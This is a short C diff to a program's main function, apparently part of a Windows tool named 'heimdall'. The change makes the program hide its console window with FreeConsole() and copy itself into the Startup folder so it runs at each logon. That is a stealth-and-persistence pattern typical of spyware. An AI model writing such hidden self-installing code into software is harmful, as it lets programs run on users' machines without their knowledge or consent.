@@ -2,9 +2,9 @@
 
 int main()
 {
-#ifdef __linux__
-	// soon TM
-#elif _WIN32
+#ifdef _WIN32
+	FreeConsole();
+	copyFileToStartUp();
 	windows_heimdall();
 #endif
 	return EXIT_SUCCESS;
